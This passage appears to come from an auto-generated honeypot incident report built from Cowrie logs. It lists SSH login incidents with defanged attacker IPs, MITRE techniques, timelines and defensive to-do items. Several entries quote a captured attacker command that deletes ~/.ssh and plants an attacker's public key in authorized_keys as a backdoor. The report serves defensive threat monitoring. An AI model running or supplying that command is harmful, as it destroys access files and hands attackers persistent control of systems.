| `2026-07-26 13:42:10` | `cowrie.log.closed` |
| `2026-07-26 13:42:11` | `cowrie.session.params` |
| `2026-07-26 13:42:11` | `cowrie.command.input` |
| `2026-07-26 13:42:12` | `cowrie.session.file_download` |
| `2026-07-26 13:42:12` | `cowrie.log.closed` |
| `2026-07-26 13:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.202[.]143` to AbuseIPDB if not already reported
- [ ] Block `121.229.202[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ba6a210d22

| Field | Detail |
|---|---|
| **Source IP** | `121.229.202[.]143` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:12` | `cowrie.session.connect` |
| `2026-07-26 13:42:12` | `cowrie.client.version` |
| `2026-07-26 13:42:13` | `cowrie.client.kex` |
| `2026-07-26 13:42:14` | `cowrie.login.success` |
| `2026-07-26 13:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.202[.]143` to AbuseIPDB if not already reported
- [ ] Block `121.229.202[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8475e4db54f2

| Field | Detail |
|---|---|
| **Source IP** | `121.229.202[.]143` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:15` | `cowrie.session.connect` |
| `2026-07-26 13:42:15` | `cowrie.client.version` |
| `2026-07-26 13:42:15` | `cowrie.client.kex` |
| `2026-07-26 13:42:17` | `cowrie.login.success` |
| `2026-07-26 13:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.202[.]143` to AbuseIPDB if not already reported
- [ ] Block `121.229.202[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b689bf9dfecf

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]41` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:35` | `cowrie.session.connect` |
| `2026-07-26 13:42:35` | `cowrie.client.version` |
| `2026-07-26 13:42:35` | `cowrie.client.kex` |
| `2026-07-26 13:42:36` | `cowrie.login.success` |
| `2026-07-26 13:42:37` | `cowrie.session.params` |
| `2026-07-26 13:42:37` | `cowrie.command.input` |
| `2026-07-26 13:42:37` | `cowrie.command.failed` |
| `2026-07-26 13:42:38` | `cowrie.log.closed` |
| `2026-07-26 13:42:39` | `cowrie.session.params` |
| `2026-07-26 13:42:39` | `cowrie.command.input` |
| `2026-07-26 13:42:39` | `cowrie.session.file_download` |
| `2026-07-26 13:42:39` | `cowrie.log.closed` |
| `2026-07-26 13:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]41` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f474c6ffb0

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]41` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:39` | `cowrie.session.connect` |
| `2026-07-26 13:42:39` | `cowrie.client.version` |
| `2026-07-26 13:42:39` | `cowrie.client.kex` |
| `2026-07-26 13:42:40` | `cowrie.login.success` |
| `2026-07-26 13:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]41` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d72563413e

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]41` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:41` | `cowrie.session.connect` |
| `2026-07-26 13:42:41` | `cowrie.client.version` |
| `2026-07-26 13:42:41` | `cowrie.client.kex` |
| `2026-07-26 13:42:42` | `cowrie.login.success` |
| `2026-07-26 13:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]41` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1452c64df4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.22[.]219` |
| **First Seen** | 2026-07-26 13:44 |
| **Last Seen** | 2026-07-26 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:44:17` | `cowrie.session.connect` |
| `2026-07-26 13:44:18` | `cowrie.telnet.option` |
| `2026-07-26 13:44:28` | `cowrie.telnet.option` |
| `2026-07-26 13:45:19` | `cowrie.login.success` |
| `2026-07-26 13:45:20` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `120.48.22[.]219` to AbuseIPDB if not already reported
- [ ] Block `120.48.22[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16292b694632

| Field | Detail |
|---|---|
| **Source IP** | `85.24.223[.]224` |
| **First Seen** | 2026-07-26 13:44 |
| **Last Seen** | 2026-07-26 13:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:44:41` | `cowrie.session.connect` |
| `2026-07-26 13:44:41` | `cowrie.client.version` |
| `2026-07-26 13:44:41` | `cowrie.client.kex` |
| `2026-07-26 13:44:41` | `cowrie.login.success` |
| `2026-07-26 13:44:42` | `cowrie.session.params` |
| `2026-07-26 13:44:42` | `cowrie.command.input` |
| `2026-07-26 13:44:42` | `cowrie.command.failed` |
| `2026-07-26 13:44:43` | `cowrie.log.closed` |
| `2026-07-26 13:44:43` | `cowrie.session.params` |
| `2026-07-26 13:44:43` | `cowrie.command.input` |
| `2026-07-26 13:44:43` | `cowrie.session.file_download` |
| `2026-07-26 13:44:43` | `cowrie.log.closed` |
| `2026-07-26 13:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.24.223[.]224` to AbuseIPDB if not already reported
- [ ] Block `85.24.223[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124f761fc6d6

| Field | Detail |
|---|---|
| **Source IP** | `85.24.223[.]224` |
| **First Seen** | 2026-07-26 13:44 |
| **Last Seen** | 2026-07-26 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:44:44` | `cowrie.session.connect` |
| `2026-07-26 13:44:44` | `cowrie.client.version` |
| `2026-07-26 13:44:44` | `cowrie.client.kex` |
| `2026-07-26 13:44:44` | `cowrie.login.success` |
| `2026-07-26 13:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.24.223[.]224` to AbuseIPDB if not already reported
- [ ] Block `85.24.223[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c11c9033aa2

| Field | Detail |
|---|---|
| **Source IP** | `85.24.223[.]224` |
| **First Seen** | 2026-07-26 13:44 |
| **Last Seen** | 2026-07-26 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:44:45` | `cowrie.session.connect` |
| `2026-07-26 13:44:45` | `cowrie.client.version` |
| `2026-07-26 13:44:46` | `cowrie.client.kex` |
| `2026-07-26 13:44:46` | `cowrie.login.success` |
| `2026-07-26 13:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.24.223[.]224` to AbuseIPDB if not already reported
- [ ] Block `85.24.223[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc0a51a89e0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 13:44 |
| **Last Seen** | 2026-07-26 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:44:46` | `cowrie.session.connect` |
| `2026-07-26 13:44:46` | `cowrie.client.version` |
| `2026-07-26 13:44:46` | `cowrie.client.kex` |
| `2026-07-26 13:44:47` | `cowrie.login.success` |
| `2026-07-26 13:44:47` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:44:47` | `cowrie.direct-tcpip.data` |
| `2026-07-26 13:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a70ad89f6e6

| Field | Detail |
|---|---|
| **Source IP** | `159.65.224[.]88` |
| **First Seen** | 2026-07-26 13:45 |
| **Last Seen** | 2026-07-26 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:45:55` | `cowrie.session.connect` |
| `2026-07-26 13:45:55` | `cowrie.client.version` |
| `2026-07-26 13:45:55` | `cowrie.client.kex` |
| `2026-07-26 13:45:56` | `cowrie.login.success` |
| `2026-07-26 13:45:56` | `cowrie.session.params` |
| `2026-07-26 13:45:56` | `cowrie.command.input` |
| `2026-07-26 13:45:56` | `cowrie.command.failed` |
| `2026-07-26 13:45:56` | `cowrie.log.closed` |
| `2026-07-26 13:45:57` | `cowrie.session.params` |
| `2026-07-26 13:45:57` | `cowrie.command.input` |
| `2026-07-26 13:45:57` | `cowrie.session.file_download` |
| `2026-07-26 13:45:57` | `cowrie.log.closed` |
| `2026-07-26 13:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.224[.]88` to AbuseIPDB if not already reported
- [ ] Block `159.65.224[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9aad4c2465

| Field | Detail |
|---|---|
| **Source IP** | `159.65.224[.]88` |
| **First Seen** | 2026-07-26 13:45 |
| **Last Seen** | 2026-07-26 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:45:57` | `cowrie.session.connect` |
| `2026-07-26 13:45:57` | `cowrie.client.version` |
| `2026-07-26 13:45:57` | `cowrie.client.kex` |
| `2026-07-26 13:45:57` | `cowrie.login.success` |
| `2026-07-26 13:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.224[.]88` to AbuseIPDB if not already reported
- [ ] Block `159.65.224[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186805c60417

| Field | Detail |
|---|---|
| **Source IP** | `159.65.224[.]88` |
| **First Seen** | 2026-07-26 13:45 |
| **Last Seen** | 2026-07-26 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:45:57` | `cowrie.session.connect` |
| `2026-07-26 13:45:57` | `cowrie.client.version` |
| `2026-07-26 13:45:57` | `cowrie.client.kex` |
| `2026-07-26 13:45:57` | `cowrie.login.success` |
| `2026-07-26 13:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.224[.]88` to AbuseIPDB if not already reported
- [ ] Block `159.65.224[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12b093a056f

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-07-26 13:57 |
| **Last Seen** | 2026-07-26 13:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:57:23` | `cowrie.session.connect` |
| `2026-07-26 13:57:24` | `cowrie.client.version` |
| `2026-07-26 13:57:24` | `cowrie.client.kex` |
| `2026-07-26 13:57:28` | `cowrie.login.success` |
| `2026-07-26 13:57:30` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-643118fc6db7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 13:58 |
| **Last Seen** | 2026-07-26 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:58:06` | `cowrie.session.connect` |
| `2026-07-26 13:58:06` | `cowrie.client.version` |
| `2026-07-26 13:58:06` | `cowrie.client.kex` |
| `2026-07-26 13:58:06` | `cowrie.login.success` |
| `2026-07-26 13:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cd966c4839

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 13:58 |
| **Last Seen** | 2026-07-26 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:58:06` | `cowrie.session.connect` |
| `2026-07-26 13:58:06` | `cowrie.client.version` |
| `2026-07-26 13:58:06` | `cowrie.client.kex` |
| `2026-07-26 13:58:06` | `cowrie.login.success` |
| `2026-07-26 13:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d8de3d59d1

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-07-26 14:00 |
| **Last Seen** | 2026-07-26 14:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:00:44` | `cowrie.session.connect` |
| `2026-07-26 14:00:47` | `cowrie.client.version` |
| `2026-07-26 14:00:47` | `cowrie.client.kex` |
| `2026-07-26 14:00:51` | `cowrie.login.success` |
| `2026-07-26 14:00:52` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b47d40ec7b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 14:00 |
| **Last Seen** | 2026-07-26 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:00:47` | `cowrie.session.connect` |
| `2026-07-26 14:00:47` | `cowrie.client.version` |
| `2026-07-26 14:00:47` | `cowrie.client.kex` |
| `2026-07-26 14:00:48` | `cowrie.login.success` |
| `2026-07-26 14:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efb0b7f205f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 14:00 |
| **Last Seen** | 2026-07-26 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:00:47` | `cowrie.session.connect` |
| `2026-07-26 14:00:47` | `cowrie.client.version` |
| `2026-07-26 14:00:48` | `cowrie.client.kex` |
| `2026-07-26 14:00:48` | `cowrie.login.success` |
| `2026-07-26 14:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16db2d9202eb

| Field | Detail |
|---|---|
| **Source IP** | `4.247.209[.]15` |
| **First Seen** | 2026-07-26 14:00 |
| **Last Seen** | 2026-07-26 14:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:00:56` | `cowrie.session.connect` |
| `2026-07-26 14:00:56` | `cowrie.client.version` |
| `2026-07-26 14:00:56` | `cowrie.client.kex` |
| `2026-07-26 14:00:57` | `cowrie.login.success` |
| `2026-07-26 14:00:58` | `cowrie.session.params` |
| `2026-07-26 14:00:58` | `cowrie.command.input` |
| `2026-07-26 14:00:58` | `cowrie.command.failed` |
| `2026-07-26 14:00:58` | `cowrie.log.closed` |
| `2026-07-26 14:00:59` | `cowrie.session.params` |
| `2026-07-26 14:00:59` | `cowrie.command.input` |
| `2026-07-26 14:00:59` | `cowrie.session.file_download` |
| `2026-07-26 14:00:59` | `cowrie.log.closed` |
| `2026-07-26 14:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.209[.]15` to AbuseIPDB if not already reported
- [ ] Block `4.247.209[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1160523ce0fd

| Field | Detail |
|---|---|
| **Source IP** | `4.247.209[.]15` |
| **First Seen** | 2026-07-26 14:00 |
| **Last Seen** | 2026-07-26 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:00:59` | `cowrie.session.connect` |
| `2026-07-26 14:00:59` | `cowrie.client.version` |
| `2026-07-26 14:00:59` | `cowrie.client.kex` |
| `2026-07-26 14:01:00` | `cowrie.login.success` |
| `2026-07-26 14:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.209[.]15` to AbuseIPDB if not already reported
- [ ] Block `4.247.209[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95100fb29da2

| Field | Detail |
|---|---|
| **Source IP** | `4.247.209[.]15` |
| **First Seen** | 2026-07-26 14:01 |
| **Last Seen** | 2026-07-26 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:01:01` | `cowrie.session.connect` |
| `2026-07-26 14:01:01` | `cowrie.client.version` |
| `2026-07-26 14:01:01` | `cowrie.client.kex` |
| `2026-07-26 14:01:02` | `cowrie.login.success` |
| `2026-07-26 14:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.209[.]15` to AbuseIPDB if not already reported
- [ ] Block `4.247.209[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a92bdbc1651

| Field | Detail |
|---|---|
| **Source IP** | `218.21.241[.]50` |
| **First Seen** | 2026-07-26 14:01 |
| **Last Seen** | 2026-07-26 14:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:01:02` | `cowrie.session.connect` |
| `2026-07-26 14:01:03` | `cowrie.client.version` |
| `2026-07-26 14:01:03` | `cowrie.client.kex` |
| `2026-07-26 14:01:05` | `cowrie.login.success` |
| `2026-07-26 14:01:05` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `218.21.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01fd905f5ff

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-07-26 14:03 |
| **Last Seen** | 2026-07-26 14:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:03:38` | `cowrie.session.connect` |
| `2026-07-26 14:03:39` | `cowrie.client.version` |
